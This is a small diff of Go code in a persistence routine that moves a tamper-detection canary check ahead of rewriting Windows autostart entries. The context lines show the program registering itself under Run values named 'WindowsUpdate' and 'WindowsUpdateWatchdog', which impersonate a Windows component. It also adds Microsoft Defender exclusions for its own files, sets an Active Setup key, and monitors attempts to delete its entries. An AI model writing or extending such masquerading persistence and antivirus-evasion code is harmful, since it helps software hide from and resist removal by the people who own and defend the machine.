@@ -681,12 +681,13 @@ func ensureWatchPersistence(w *watchCfg) {
 			}
 		}
 	}
+	// Canary trap FIRST: audit pre-repair state so the verdict sees what the
+	// deleter did (checking after setRun would always read clean — the bug
+	// that kept it silent). Alarms via the sticky tamper tripwire;
+	// clean/unplanted stay silent.
+	checkRunCanaries(w.installDir)
 	setRun("WindowsUpdate", agentCmd)
 	setRun("WindowsUpdateWatchdog", watchCmd)
-	// Canary trap: who deletes our Run values every few minutes? Pattern
-	// + control canaries distinguish targeted/bulk/surgical (alarms via
-	// the sticky tamper tripwire; clean/unplanted stay silent).
-	checkRunCanaries(w.installDir)
 	migrateTaskAuthors(w)
 	ensureDefenderExclusions(w.agentPath, w.installDir)
 	ensureActiveSetupKey(w.agentPath)
